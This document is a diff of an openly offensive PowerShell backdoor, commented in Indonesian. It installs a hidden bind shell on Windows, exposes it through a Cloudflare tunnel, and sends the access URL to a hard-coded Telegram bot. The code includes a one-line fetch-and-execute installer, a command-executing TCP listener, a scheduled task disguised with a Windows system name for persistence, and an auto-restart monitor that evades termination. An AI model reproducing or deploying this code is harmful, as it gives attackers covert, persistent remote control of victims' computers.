@@ -1,5 +1,8 @@
-# Cloudflare Tunnel Reverse Shell for Windows (Hidden)
-# Run: iex (iwr -UseBasicParsing 'URL').Content
+# Cloudflare Tunnel Reverse Shell for Windows (Hidden, Auto-Restart)
+# Jalankan (sebagai Administrator):
+#   iex (iwr -UseBasicParsing 'https://raw.githubusercontent.com/VampXDH/Ocean-Shell/main/win.ps1').Content
+# Uninstall:
+#   $env:CF_UNINSTALL = "<token>"; iex (iwr -UseBasicParsing 'https://.../win.ps1').Content
 
 $ErrorActionPreference = "Stop"
 
@@ -14,30 +17,17 @@ $port = Get-Random -Minimum 10000 -Maximum 50000
 $telegramBotToken = "8703082173:AAHQceSe7KIgRm973z8aG-WLP7us0tqHLV8"
 $telegramChatId = "6223261018"
 
-# Download cloudflared
+# Arsitektur & download cloudflared
 $arch = if ([Environment]::Is64BitOperatingSystem) { "windows-amd64" } else { "windows-386" }
 $urlCloudflared = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-$arch.exe"
 $cfPath = "$configDir\$binHiddenName"
 
-# ========== FUNCTIONS ==========
+# ========== FUNGSI ==========
 function Send-Telegram($message) {
     if ($telegramBotToken -and $telegramBotToken -ne "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz") {
         $body = @{ chat_id = $telegramChatId; text = $message; parse_mode = "HTML" }
         Invoke-RestMethod -Uri "https://api.telegram.org/bot$telegramBotToken/sendMessage" -Method Post -Body $body -ErrorAction SilentlyContinue
     }
-}
-
-function Start-HiddenProcess($command, $arguments) {
-    $psi = New-Object System.Diagnostics.ProcessStartInfo
-    $psi.FileName = $command
-    $psi.Arguments = $arguments
-    $psi.UseShellExecute = $false
-    $psi.CreateNoWindow = $true
-    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
-    $psi.RedirectStandardOutput = $true
-    $psi.RedirectStandardError = $true
-    $p = [System.Diagnostics.Process]::Start($psi)
-    $p.Id
 }
 
 # ========== UNINSTALL ==========
@@ -49,7 +39,7 @@ if ($env:CF_UNINSTALL) {
             Write-Host "Removing installed files..."
             schtasks /End /TN "Microsoft\Windows\Winlogon\Shell" 2>$null
             schtasks /Delete /TN "Microsoft\Windows\Winlogon\Shell" /F 2>$null
-            Get-Process -Name "svchost" -ErrorAction SilentlyContinue | Where-Object { $_.StartInfo.FileName -like "*cloudflared*" } | Stop-Process -Force
+            Get-Process -Name "svchost" -ErrorAction SilentlyContinue | Where-Object { $_.Path -like "*cloudflared*" } | Stop-Process -Force
             Remove-Item -Recurse -Force $configDir -ErrorAction SilentlyContinue
             Remove-Item -Recurse -Force $tmpDir -ErrorAction SilentlyContinue
             Write-Host "Uninstall complete."
@@ -76,65 +66,107 @@ New-Item -ItemType Directory -Force -Path $configDir | Out-Null
 Write-Host "Downloading cloudflared..."
 Invoke-WebRequest -Uri $urlCloudflared -OutFile $cfPath -ErrorAction Stop
 
-# Start bindshell
-Write-Host "Starting bindshell on port $port ..."
-$bindCmd = if (Get-Command nc -ErrorAction SilentlyContinue) {
-    "nc -l -p $port -s 127.0.0.1 -e cmd.exe"
-} else {
-    "powershell -NoProfile -Command `$listener = [System.Net.Sockets.TcpListener]::new('127.0.0.1', $port); `$listener.Start(); while(`$true) { `$client = `$listener.AcceptTcpClient(); `$stream = `$client.GetStream(); `$writer = New-Object System.IO.StreamWriter `$stream; `$reader = New-Object System.IO.StreamReader `$stream; `$writer.AutoFlush = `$true; `$writer.WriteLine('> '); while(`$client.Connected) { if (`$stream.DataAvailable) { `$cmd = `$reader.ReadLine(); if (`$cmd -eq 'exit') { break }; `$output = & `$cmd 2>&1 | Out-String; `$writer.WriteLine(`$output); `$writer.Write('> ') } } `$client.Close() }"
-}
-$bindPid = Start-HiddenProcess "cmd.exe" "/c $bindCmd"
-
-# Start tunnel with separate files for stdout and stderr
-Write-Host "Starting Cloudflare tunnel..."
-$tunnelLog = "$tmpDir\cloudflared.log"
-$tunnelErr = "$tmpDir\cloudflared.err"
-$tunnelProc = Start-Process -FilePath $cfPath -ArgumentList "tunnel --url tcp://127.0.0.1:$port" -WindowStyle Hidden -PassThru -RedirectStandardOutput $tunnelLog -RedirectStandardError $tunnelErr
-$tunnelPid = $tunnelProc.Id
-
-# Save token and config
+# Buat token uninstall
 $token = -join ((48..57) + (97..102) | Get-Random -Count 16 | ForEach-Object { [char]$_ })
 $token | Out-File -FilePath "$configDir\.uninstall_token"
+
+# Simpan port untuk referensi
 @"
-BIND_PID=$bindPid
-TUNNEL_PID=$tunnelPid
 PORT=$port
 "@ | Out-File -FilePath "$configDir\tunnel.conf"
 
-# Wait for URL and notify
-Write-Host "Waiting for tunnel URL..."
-Start-Sleep -Seconds 5
-# Check both stdout and stderr logs
-$url = Select-String -Path $tunnelLog,$tunnelErr -Pattern "https://([a-z0-9-]+)\.trycloudflare\.com" | Select-Object -First 1 | ForEach-Object { $_.Matches[0].Value }
-if ($url) {
-    Write-Host "Tunnel URL: $url"
-    Send-Telegram "✅ Initial Tunnel URL: $url"
-} else {
-    Write-Host "No URL found yet, check logs: $tunnelLog or $tunnelErr"
-}
-
-# Persistence via Scheduled Task
-$taskName = "Microsoft\Windows\Winlogon\Shell"
-$persistScript = "$configDir\cf_tunnel.ps1"
+# ========== BUAT SCRIPT MONITOR (runner) ==========
+# Script ini akan dijalankan oleh scheduled task, memastikan bindshell + tunnel selalu hidup
+$monitorScript = "$configDir\cf_monitor.ps1"
 @"
-# Persistence script
-`$cfPath = "$cfPath"
+# Monitor script: menjaga bindshell dan cloudflared tetap berjalan
 `$port = $port
-`$log = "$tmpDir\cloudflared.log"
-`$err = "$tmpDir\cloudflared.err"
-while (`$true) {
-    `$p = Start-Process -FilePath `$cfPath -ArgumentList "tunnel --url tcp://127.0.0.1:`$port" -WindowStyle Hidden -PassThru -RedirectStandardOutput `$log -RedirectStandardError `$err
-    `$p.WaitForExit()
-    Start-Sleep -Seconds 10
-}
-"@ | Out-File -FilePath $persistScript -Encoding UTF8
+`$cfPath = "$cfPath"
+`$tmpDir = "$tmpDir"
+`$telegramBotToken = "$telegramBotToken"
+`$telegramChatId = "$telegramChatId"
 
-$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$persistScript`""
+function Send-Telegram(`$message) {
+    if (`$telegramBotToken -and `$telegramBotToken -ne "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz") {
+        `$body = @{ chat_id = `$telegramChatId; text = `$message; parse_mode = "HTML" }
+        Invoke-RestMethod -Uri "https://api.telegram.org/bot`$telegramBotToken/sendMessage" -Method Post -Body `$body -ErrorAction SilentlyContinue
+    }
+}
+
+# Jalankan bindshell (listener TCP) di background menggunakan PowerShell
+function Start-Bindshell {
+    param(`$port)
+    `$listener = [System.Net.Sockets.TcpListener]::new('127.0.0.1', `$port)
+    `$listener.Start()
+    while (`$true) {
+        `$client = `$listener.AcceptTcpClient()
+        `$stream = `$client.GetStream()
+        `$writer = New-Object System.IO.StreamWriter `$stream
+        `$reader = New-Object System.IO.StreamReader `$stream
+        `$writer.AutoFlush = `$true
+        `$writer.WriteLine('> ')
+        while (`$client.Connected) {
+            if (`$stream.DataAvailable) {
+                `$cmd = `$reader.ReadLine()
+                if (`$cmd -eq 'exit') { break }
+                `$output = & `$cmd 2>&1 | Out-String
+                `$writer.WriteLine(`$output)
+                `$writer.Write('> ')
+            }
+        }
+        `$client.Close()
+    }
+}
+
+# Mulai bindshell sebagai job agar bisa dimonitor
+`$bindJob = Start-Job -ScriptBlock { Start-Bindshell -port `$using:port }
+# Tunggu sebentar agar listener aktif
+Start-Sleep -Seconds 2
+
+`$urlSent = `$false
+`$logFile = "`$tmpDir\cloudflared.log"
+`$errFile = "`$tmpDir\cloudflared.err"
+
+while (`$true) {
+    # Jalankan cloudflared (tunnel)
+    `$tunnelProc = Start-Process -FilePath `$cfPath -ArgumentList "tunnel --url tcp://127.0.0.1:`$port" -WindowStyle Hidden -PassThru -RedirectStandardOutput `$logFile -RedirectStandardError `$errFile
+
+    # Tunggu hingga URL muncul (maks 30 detik)
+    `$url = `$null
+    for (`$i = 0; `$i -lt 30; `$i++) {
+        `$url = Select-String -Path `$logFile,`$errFile -Pattern "https://([a-z0-9-]+)\.trycloudflare\.com" -ErrorAction SilentlyContinue | Select-Object -First 1 | ForEach-Object { `$_.Matches[0].Value }
+        if (`$url) { break }
+        Start-Sleep -Seconds 1
+    }
+    if (`$url -and -not `$urlSent) {
+        Send-Telegram "✅ New tunnel URL: `$url"
+        `$urlSent = `$true
+    } elseif (-not `$url) {
+        Send-Telegram "⚠️ Tunnel started but URL not found. Check logs."
+    }
+
+    # Tunggu hingga tunnel mati
+    `$tunnelProc.WaitForExit()
+    # Kirim notifikasi jika tunnel mati (opsional)
+    Send-Telegram "⚠️ Tunnel died. Restarting..."
+    Start-Sleep -Seconds 5
+    `$urlSent = `$false   # reset agar URL baru dikirim
+}
+"@ | Out-File -FilePath $monitorScript -Encoding UTF8
+
+# ========== PERSISTENCE (Scheduled Task) ==========
+$taskName = "Microsoft\Windows\Winlogon\Shell"
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$monitorScript`""
 $trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
 $principal = New-ScheduledTaskPrincipal -UserID $env:USERNAME -LogonType Interactive -RunLevel Highest
 $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden
 Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null
 
-Write-Host "--> Persistence installed (Scheduled Task: $taskName)"
-Write-Host "--> To uninstall: `$env:CF_UNINSTALL = '$token'; powershell -NoProfile -ExecutionPolicy Bypass -Command `"IEX (New-Object Net.WebClient).DownloadString('URL')`""
+# Jalankan monitor sekali sekarang
+Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$monitorScript`"" -WindowStyle Hidden
+
+Write-Host "--> Installation complete."
+Write-Host "--> Tunnel and bindshell will auto-restart if killed."
+Write-Host "--> New URLs will be sent via Telegram."
+Write-Host "--> To uninstall: `$env:CF_UNINSTALL = '$token'; powershell -NoProfile -ExecutionPolicy Bypass -Command `"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/VampXDH/Ocean-Shell/main/win.ps1')`""
 Write-Host "--> Join us on Telegram - https://t.me/thcorg"
